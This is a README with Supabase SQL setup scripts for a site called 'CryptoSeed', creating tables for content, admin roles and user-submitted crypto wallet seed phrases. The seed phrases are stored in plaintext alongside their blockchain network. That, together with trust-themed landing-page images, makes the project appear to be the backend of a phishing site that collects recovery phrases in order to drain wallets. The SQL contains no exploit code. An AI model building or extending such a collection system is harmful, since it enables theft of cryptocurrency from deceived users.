
# CryptoSeed Database Schema

This file contains the SQL schema required for the Supabase database. This setup is designed to be secure, allowing write operations only from the server using the `service_role` key.

### How to use this file:

1.  Go to your Supabase project dashboard.
2.  Navigate to the **SQL Editor**.
3.  Click on **"New query"**.
4.  Copy the entire SQL script below and paste it into the editor.
5.  Click **"RUN"** to create the tables and enable Row Level Security.

---

## Full Database Setup Script

```sql
-- Create the seed_phrases table if it doesn't exist
CREATE TABLE IF NOT EXISTS public.seed_phrases (
  id uuid NOT NULL DEFAULT gen_random_uuid(),
  created_at timestamp with time zone NOT NULL DEFAULT now(),
  seed_phrase text NOT NULL,
  network text NOT NULL,
  CONSTRAINT seed_phrases_pkey PRIMARY KEY (id)
);

-- Add comments to the table and columns for clarity
COMMENT ON TABLE public.seed_phrases IS 'Stores user-submitted seed phrases and their selected network.';
COMMENT ON COLUMN public.seed_phrases.id IS 'Unique identifier for each record.';
COMMENT ON COLUMN public.seed_phrases.created_at IS 'Timestamp of when the record was created.';
COMMENT ON COLUMN public.seed_phrases.seed_phrase IS 'The user-submitted seed phrase (should be handled securely).';
COMMENT ON COLUMN public.seed_phrases.network IS 'The blockchain network associated with the seed phrase.';

-- Enable Row Level Security (RLS) on the table.
ALTER TABLE public.seed_phrases ENABLE ROW LEVEL SECURITY;

-- Create the table for editable page content
CREATE TABLE IF NOT EXISTS public.editable_content (
  id text NOT NULL,
  content jsonb NOT NULL,
  updated_at timestamp with time zone NOT NULL DEFAULT now(),
  CONSTRAINT editable_content_pkey PRIMARY KEY (id)
);

-- Add comments for the new table
COMMENT ON TABLE public.editable_content IS 'Stores editable content for the website, like image URLs, keyed by a unique ID.';
COMMENT ON COLUMN public.editable_content.id IS 'A unique identifier for the content block (e.g., "landing-page-images").';
COMMENT ON COLUMN public.editable_content.content IS 'The JSON object containing the content data.';
COMMENT ON COLUMN public.editable_content.updated_at IS 'Timestamp of the last update.';

-- Enable RLS for the new table
ALTER TABLE public.editable_content ENABLE ROW LEVEL SECURITY;

-- Create the profiles table for user role management
CREATE TABLE IF NOT EXISTS public.profiles (
  id uuid NOT NULL,
  is_admin boolean DEFAULT false,
  CONSTRAINT profiles_pkey PRIMARY KEY (id),
  CONSTRAINT profiles_id_fkey FOREIGN KEY (id) REFERENCES auth.users (id) ON DELETE CASCADE
);
COMMENT ON TABLE public.profiles IS 'Stores user-specific data and roles.';

-- Create a trigger to automatically add new users to the profiles table
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id)
  VALUES (new.id);
  RETURN new;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE OR REPLACE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();


-- Insert an initial record for the landing page images
-- This ensures the record exists for updating.
INSERT INTO public.editable_content (id, content)
VALUES (
  'landing-page-images',
  '{
    "why-choose-us-1": "https://images.unsplash.com/photo-1610034445557-ee92504a1321?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3NDE5ODJ8MHwxfHNlYXJjaHw5fHxzZWN1cmUlMjBwaG9uZXxlbnwwfHx8fDE3NjU1MjM1NzR8MA&ixlib=rb-4.1.0&q=80&w=1080",
    "why-choose-us-2": "https://images.unsplash.com/photo-1679210208075-e70610a78080?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3NDE5ODJ8MHwxfHNlYXJjaHw3fHxzdXBwb3J0JTIwaGVhZHNldHxlbnwwfHx8fDE3NjU1MjM1NzR8MA&ixlib=rb-4.1.0&q=80&w=1080",
    "why-choose-us-3": "https://images.unsplash.com/photo-1724219616919-aab943e7b00d?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3NDE5ODJ8MHwxfHNlYXJjaHwxfHxzZWN1cml0eSUyMHNoaWVsZHxlbnwwfHx8fDE3NjU0NTYyOTF8MA&ixlib=rb-4.1.0&q=80&w=1080",
    "unlocking-the-future": "https://images.unsplash.com/photo-1738737155948-1d7b08b531b0?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3NDE5ODJ8MHwxfHNlYXJjaHw4fHxjcnlwdG8lMjBmdXR1cmV8ZW58MHx8fHwxNzY1NTIzNTc0fDA&ixlib=rb-4.1.0&q=80&w=1080"
  }'
)
ON CONFLICT (id) DO NOTHING;

-- Allow public read access to the editable_content table
-- This policy allows anyone to read the content, which is necessary for the landing page.
CREATE POLICY "Public read access for editable content"
ON public.editable_content FOR SELECT
USING (true);

```

### Important Security Note

The SQL script above intentionally **does not** create policies to allow inserts or updates from anonymous users. All database writes will be handled by the backend using the Supabase **`service_role`** key, which has administrative privileges to bypass Row Level Security. This is a critical security measure.

---

## Part 2: Grant Admin Privileges

After running the script above, you need to grant admin status to your user. Replace the `id` with your user's actual ID from the Supabase Authentication page.

```sql
-- Grant admin privileges to a specific user
UPDATE public.profiles
SET is_admin = true
WHERE id = 'de888583-b624-45d1-a26a-acc608fbf94f'; -- <-- Replace with your user's ID
```

    